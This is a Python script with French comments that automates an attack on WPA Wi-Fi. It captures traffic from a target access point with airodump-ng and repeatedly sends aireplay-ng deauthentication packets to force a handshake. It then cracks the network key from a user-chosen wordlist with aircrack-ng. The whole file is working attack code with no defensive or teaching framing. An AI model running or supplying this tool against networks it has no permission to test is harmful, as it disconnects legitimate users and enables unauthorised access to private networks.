import subprocess
import json
import re
from networkscan import *
from save_to import *

# Ajout Des Success color
SUCCESS_COLOR = "\033[92m"  # Green
ERROR_COLOR = "\033[91m"    # Red
INFO_COLOR = "\033[93m"     # Yellow
RESET_COLOR = "\033[0m"     # Reset

# Fonction pour capturer des paquets à partir d'un fichier JSON cible
def capture_from_target_json_wpa(interface, target_path="Target/target.json", output_dir="Capture"):
    """
    Effectue une capture de paquets à partir des informations du fichier target.json.
    
    :param interface: Interface réseau à utiliser pour la capture (par exemple, "wlan0mon").
    :param target_path: Chemin vers le fichier target.json contenant les informations réseau.
    :param output_dir: Dossier pour enregistrer les fichiers de capture (par défaut "Capture").
    """
    try:
        with open(target_path, "r") as file:
            target_data = json.load(file)
            if not target_data:
                print(f"{ERROR_COLOR}[ERROR] : Le fichier target.json est vide ou mal formaté.{RESET_COLOR}")
                return

            bssid = target_data["BSSID"]
            channel = target_data["Channel"]
            capture_file = os.path.join(output_dir, "capture_handshake")
            process = subprocess.Popen(
                ["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, "--write", capture_file, interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )  
            
            print(f"{INFO_COLOR}Attente de 5 secondes avant le lancement des paquets de désauthentification{RESET_COLOR}")
            time.sleep(5)
            monitor_for_handshake_and_attack(bssid, interface)
            process.terminate()
            print(f"{SUCCESS_COLOR}Processus de capture terminé.{RESET_COLOR}")
            
    except FileNotFoundError:
        print(f"{ERROR_COLOR}[ERROR] : Le fichier {target_path} n'existe pas.{RESET_COLOR}")
    except json.JSONDecodeError:
        print(f"{ERROR_COLOR}[ERROR] : Le fichier {target_path} n'est pas un JSON valide.{RESET_COLOR}")
    except Exception as e:
        print(f"{ERROR_COLOR}[ERROR] : Une erreur inattendue s'est produite : {str(e)}{RESET_COLOR}")

# Fonction pour exécuter une attaque de désauthentification
def execute_deauth_attack(bssid, interface, packets=30):
    """
    Exécute une attaque de désauthentification sur le réseau Wi-Fi cible.
    
    Parameters:
    - bssid (str): L'adresse MAC du point d'accès cible.
    - interface (str): L'interface réseau en mode moniteur.
    - packets (int): Nombre de paquets de désauthentification à envoyer (par défaut 30).
    """
    try:
        command = f"sudo aireplay-ng --deauth {packets} -a {bssid} {interface}"
        result = subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        if result.returncode == 0:
            print(f"{SUCCESS_COLOR}[SUCCESS] : Attaque de désauthentification lancée sur {bssid} via {interface}.{RESET_COLOR}")
            print(result.stdout)
        else:
            print(f"{ERROR_COLOR}[ERROR] : Une erreur s'est produite lors de l'attaque.\n{result.stderr}{RESET_COLOR}")
    except Exception as e:
        print(f"{ERROR_COLOR}[EXCEPTION] : Une erreur s'est produite : {e}{RESET_COLOR}")

# Fonction pour vérifier si un handshake a été capturé
def check_handshake(capture_file):
    """
    Vérifie si un handshake a été capturé dans le fichier fourni.

    Parameters:
    - capture_file (str): Le chemin vers le fichier .cap généré par airodump-ng.

    Returns:
    - bool: True si un handshake est détecté, False sinon.
    """
    try:
        command = f"aircrack-ng {capture_file} -w /dev/null"
        result = subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        if "1 handshake" in result.stdout:
            print(f"{SUCCESS_COLOR}[SUCCESS] : 1 Handshake détecté dans {capture_file}.{RESET_COLOR}")
            time.sleep(2)
            return True
        else:
            print(f"{INFO_COLOR}[INFO] : Aucun handshake détecté dans {capture_file}.{RESET_COLOR}")
            return False
    except Exception as e:
        print(f"{ERROR_COLOR}[EXCEPTION] : Une erreur s'est produite lors de la vérification : {e}{RESET_COLOR}")
        return False

# Fonction pour surveiller le handshake et exécuter des attaques de deauth
def monitor_for_handshake_and_attack(bssid, interface):
    """
    Effectue une boucle qui exécute une attaque de deauth toutes les 30 secondes
    et vérifie si un handshake a été capturé.

    Parameters:
    - bssid (str): L'adresse MAC du réseau cible.
    - interface (str): L'interface réseau à utiliser pour l'attaque.
    """
    print(f"{INFO_COLOR}[INFO] : Surveillance du handshake en cours...{RESET_COLOR}")
    while True:
        execute_deauth_attack(bssid, interface)
        time.sleep(30)  # Attendre 30 secondes entre chaque tentative
        
        if check_handshake("Capture/capture_handshake-01.cap"):
            print(f"{SUCCESS_COLOR}[SUCCESS] : Handshake capturé avec succès. Passage à l'étape suivante.{RESET_COLOR}")
            time.sleep(2)
            break
        else:
            print(f"{INFO_COLOR}[INFO] : Aucun handshake détecté. Nouvelle tentative...{RESET_COLOR}")

# Fonction pour lister et choisir une wordlist
def list_and_choose_wordlist(wordlist_dir="Wordlist"):
    """
    Liste les fichiers de wordlists disponibles dans le dossier spécifié et permet à l'utilisateur d'en choisir un.

    :param wordlist_dir: Le dossier contenant les fichiers de wordlists (par défaut "Wordlist").
    :return: Le chemin complet vers la wordlist sélectionnée ou None si aucune sélection.
    """
    try:
        if not os.path.exists(wordlist_dir):
            print(f"{ERROR_COLOR}[ERROR] : Le dossier '{wordlist_dir}' n'existe pas.{RESET_COLOR}")
            return None
        
        wordlists = [f for f in os.listdir(wordlist_dir) if os.path.isfile(os.path.join(wordlist_dir, f))]
        if not wordlists:
            print(f"{INFO_COLOR}[INFO] : Aucun fichier de wordlist trouvé dans '{wordlist_dir}'.{RESET_COLOR}")
            return None

        print(f"{INFO_COLOR}[INFO] : Wordlists disponibles :{RESET_COLOR}")
        for i, wordlist in enumerate(wordlists, start=1):
            print(f"{INFO_COLOR}{i}. {wordlist}{RESET_COLOR}")
        
        choice = int(input("Entrez le numéro de la wordlist à utiliser : "))
        if 1 <= choice <= len(wordlists):
            selected_wordlist = os.path.join(wordlist_dir, wordlists[choice - 1])
            print(f"{SUCCESS_COLOR}[SUCCESS] : Wordlist sélectionnée : {selected_wordlist}{RESET_COLOR}")
            return selected_wordlist
        else:
            print(f"{ERROR_COLOR}[ERROR] : Choix invalide. Veuillez réessayer.{RESET_COLOR}")
            return None
    except ValueError:
        print(f"{ERROR_COLOR}[ERROR] : Entrée invalide. Veuillez entrer un numéro valide.{RESET_COLOR}")
    except Exception as e:
        print(f"{ERROR_COLOR}[EXCEPTION] : Une erreur s'est produite : {e}{RESET_COLOR}")
    return None

# Fonction pour cracker un handshake avec une wordlist
def crack_handshake_with_wordlist(wordlist_path, capture_file="Capture/capture_handshake-01.cap"):
    """
    Tente de cracker un handshake WPA en utilisant une wordlist avec aircrack-ng et affiche la progression.
    
    :param wordlist_path: Le chemin vers la wordlist à utiliser.
    :param capture_file: Le chemin vers le fichier de capture contenant le handshake.
    """
    if not wordlist_path:
        print(f"{ERROR_COLOR}[ERROR] : Aucun chemin de wordlist fourni.{RESET_COLOR}")
        return

    try:
        with open(wordlist_path, 'r') as file:
            total_passwords = sum(1 for _ in file)
        
        command = f"sudo aircrack-ng -w {wordlist_path} {capture_file}"
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        for line in process.stdout:
            print(line.strip())
            
            if "KEY FOUND!" in line:
                key_match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", line)
                if key_match:
                    key = key_match.group(1)
                    print(f"{SUCCESS_COLOR}[SUCCESS] : Clé trouvée ! La clé WPA est : {key}{RESET_COLOR}")
                    process.kill()
                    return

        process.wait()
        if process.returncode == 0:
            print(f"{INFO_COLOR}[INFO] : Tentative de craquage terminée.{RESET_COLOR}")
        else:
            print(f"{ERROR_COLOR}[ERROR] : Une erreur s'est produite lors de l'exécution.\n{process.stderr.read()}{RESET_COLOR}")
    except Exception as e:
        print(f"{ERROR_COLOR}[EXCEPTION] : Une erreur inattendue s'est produite : {e}{RESET_COLOR}")
